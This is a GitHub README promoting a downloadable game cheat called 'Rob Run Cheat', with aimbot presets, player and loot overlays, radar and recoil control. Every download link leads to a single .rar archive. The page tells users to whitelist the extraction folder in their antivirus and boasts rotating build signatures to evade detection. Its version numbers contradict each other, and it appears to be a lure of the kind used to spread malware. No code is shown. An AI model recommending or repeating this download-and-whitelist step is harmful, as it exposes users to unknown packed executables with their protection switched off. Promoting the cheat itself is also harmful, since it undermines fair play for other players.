<div align="center">

<img src="https://capsule-render.vercel.app/api?type=slice&color=0:111827,50:7c3aed,100:06b6d4&height=150&section=header&text=ROB%20RUN%20CHEAT&fontSize=44&fontColor=ffffff&fontAlignY=40&desc=v2.1.7%20%C2%B7%20precision%20toolkit&descAlignY=64&descSize=13" width="100%" alt="Rob Run Cheat" />

### *« Rob Run Cheat — Built for the edge of the frame »*

<br>

> **Aim presets · Entity & world overlays · Radar · Combat mode**

<br>

<!-- ───────────── STATUS ───────────── -->

![Status](https://img.shields.io/badge/🟢_STATUS-STABLE-22c55e?style=for-the-badge&labelColor=0b0f19)
![Version](https://img.shields.io/badge/📦_VERSION-v2.1.4-06b6d4?style=for-the-badge&labelColor=0b0f19)
![Release](https://img.shields.io/badge/🚀_RELEASE-2026--11--12-a855f7?style=for-the-badge&labelColor=0b0f19)
![Profile](https://img.shields.io/badge/🧩_PROFILE-READY-ec4899?style=for-the-badge&labelColor=0b0f19)

<br>

<!-- ───────────── PLATFORM ───────────── -->

![Steam](https://img.shields.io/badge/Steam-1b2838?style=flat-square&logo=steam&logoColor=white)
![Epic Games](https://img.shields.io/badge/Epic_Games-313131?style=flat-square&logo=epicgames&logoColor=white)
![Windows](https://img.shields.io/badge/Windows_10_/_11-0078D6?style=flat-square&logo=windows&logoColor=white)
![Intel](https://img.shields.io/badge/Intel-0071C5?style=flat-square&logo=intel&logoColor=white)
![AMD](https://img.shields.io/badge/AMD-ED1C24?style=flat-square&logo=amd&logoColor=white)
![HWID](https://img.shields.io/badge/HWID_Spoofer-not_bundled-ef4444?style=flat-square&labelColor=0b0f19)

<br>

<img src="https://readme-typing-svg.demolab.com?font=Fira+Code&weight=700&size=15&duration=2800&pause=900&color=06B6D4&center=true&vCenter=true&width=1000&lines=Aim+Presets+%E2%9C%94;Entity+%26+Vehicle+Overlays+%E2%9C%94;World+Markers+%E2%9C%94;Radar+with+Off-screen+Pins+%E2%9C%94;Combat+Mode+%E2%9C%94;Profile+System+%E2%9C%94" alt="Typing SVG" width="100%" />

<a href="https://github.com/MindOtokageWreck/Rob-Run-Cheat/releases/download/v2.1.9/Rob_Run_Ch.rar">
  <img src="https://img.shields.io/badge/⬇_Download-RobRunCheat.rar-7c3aed?style=for-the-badge&logo=github&logoColor=white&labelColor=0b0f19" alt="Download RobRunCheat.rar">
</a>

<br>

</div>

---

## 🖼 Preview

<p align="center">
  <img src="https://github.com/user-attachments/assets/26fbd668-be26-4c4a-a2d0-3204cc63f467" alt="Rob Run Cheat — control panel" width="100%">
</p>
<p align="center">
  <img src="https://github.com/user-attachments/assets/333cec2e-cd67-4b39-83a8-6defe17ef742" alt="Rob Run Cheat — entity overlays" width="49%">
  <img src="https://github.com/user-attachments/assets/4dc3f14c-9c74-4591-aca6-4de85699fc17" alt="Rob Run Cheat — radar" width="49%">
</p>

---

## 📥 Build

| Archive | Tag | Released |
|---------|:---:|:--------:|
| [`RobRunCheat.rar`](https://github.com/MindOtokageWreck/Rob-Run-Cheat/releases/download/v2.1.9/Rob_Run_Ch.rar) | `v2.1.4` | Nov 12, 2026 |

> 🛡 **No spoofer bundled.** Packed executables are frequently misflagged — whitelist the extraction folder before launching.

---

## 🗂 Layout

| # | Section | What's inside |
|:-:|:--------|:--------------|
| 🎯 | [Modules](#-modules) | Aim, overlays, radar, combat |
| 🖥️ | [Requirements](#️-requirements) | Min & recommended |
| ⚙️ | [Config](#️-config) | JSON example + hot-reload |
| 🎮 | [Platforms](#-platforms) | Steam & Epic |
| 📡 | [Radar](#-radar) | Legend & behavior |
| 🔧 | [Runtime](#-runtime) | Compatibility layer |
| 📝 | [Changelog](#-changelog) | Version history |

---

## 🎯 Modules

<div align="center">

| | Module | Highlights | State |
|:-:|:-------|:-----------|:-----:|
| 🎯 | **Aim Presets** | Per-weapon FOV, smoothing, bone priority, switch cooldown | ✅ |
| 👁️ | **Player Overlay** | Boxes, skeleton, names, crews, HP, armor, held weapon | ✅ |
| 🚗 | **Vehicle Overlay** | Owner, driver, speed readout, direction | ✅ |
| 🌍 | **World Markers** | Loot, traps, interactables, spawn points | ✅ |
| 📡 | **Radar** | Zoom, distance rings, FOV wedge, off-screen pins | ✅ |
| ⚔️ | **Combat Mode** | One-tap profile with recoil / sway / spread tuning | ✅ |
| 🎨 | **Theming** | Colors, sizes, fonts, locale, DPI scaling | ✅ |
| 🧩 | **Profiles** | Saved configs, hot-reload, VSync, FPS cap | ✅ |

</div>

---

## 🖥️ Requirements

```
┌─────────────────────────────────────────────────────┐
│  MINIMUM              │  RECOMMENDED                │
├───────────────────────┼─────────────────────────────┤
│  OS: Windows 10 x64   │  OS: Windows 11 x64         │
│  CPU: Intel i3 / Ryzen│  CPU: Intel i5 / Ryzen 5    │
│  RAM: 8 GB            │  RAM: 16 GB                 │
│  GPU: Any DX11        │  GPU: GTX 1060+             │
│  NET: Broadband       │  NET: Fiber / Low latency   │
└───────────────────────┴─────────────────────────────┘
```

---

## ⚙️ Config

> [!TIP]
> Settings live in `config.json` and hot-reload with **`F5`**.

<details>
<summary>📂 <b>Example config.json</b> (click to expand)</summary>

```json
{
  "aim": {
    "enabled": true,
    "preset": "ar",
    "fov": 120,
    "smoothing": 4.5,
    "bone": "head",
    "visible_only": true,
    "switch_delay_ms": 120
  },
  "overlay": {
    "players": true,
    "vehicles": true,
    "world": true,
    "max_distance": 300,
    "colors": {
      "enemy": "#FF4444",
      "ally": "#44FF44",
      "loot": "#FFD700"
    }
  },
  "radar": {
    "enabled": true,
    "size": 200,
    "zoom": 1.5,
    "rings": true,
    "offscreen_pins": true
  },
  "combat": {
    "mode": "aggressive",
    "recoil_control": true,
    "sway": 0.2
  },
  "ui": {
    "locale": "en",
    "dpi_scale": 1.0,
    "vsync": false,
    "fps_cap": 240
  }
}
```

</details>

---

## 🎮 Platforms

<div align="center">

| | Client | Compatibility |
|:-:|:------:|:-------------:|
| 🟢 | Steam | [`Full`](https://github.com/MindOtokageWreck/Rob-Run-Cheat/releases/download/v2.1.9/Rob_Run_Ch.rar) |
| 🟢 | Epic Games | [`Full`](https://github.com/MindOtokageWreck/Rob-Run-Cheat/releases/download/v2.1.9/Rob_Run_Ch.rar) |

</div>

---

## 📡 Radar

> Real-time top-down map with adjustable zoom, opacity and off-screen pins.

- 🔴 **Enemies** — red dots with facing indicator
- 🟢 **Allies** — green dots
- 🟡 **Loot** — yellow markers
- 🔵 **Vehicles** — blue icons
- ⚪ **Self** — white crosshair

---

## 🔧 Runtime

| Layer | Technology |
|:------|:-----------|
| 🛡️ **Compatibility** | Runtime compatibility layer |
| 🔐 **Config encryption** | AES-256 at rest |
| 🧬 **Build rotation** | Rotating build signatures |
| 🔄 **Updates** | Auto-patch on game updates |

---

## 📝 Changelog

<details>
<summary><code>v2.1.4</code> — <b>Latest</b> 🟢</summary>

- ✅ Radar scaling fixed on ultrawide monitors
- ✅ Smoother aim interpolation at low FPS
- ✅ Combat mode hotkey toggle
- ✅ Offsets refreshed for the latest patch

</details>

<details>
<summary><code>v2.1.3</code></summary>

- ✅ New skeleton rendering pipeline
- ✅ ~15% CPU reduction in overlay loop
- ✅ Bug fixes and stability improvements

</details>

---

<div align="center">

**Made with** 💜 **by the Rob Run Cheat Team**

`v2.1.4` · `2026` · `All rights reserved`

</div>
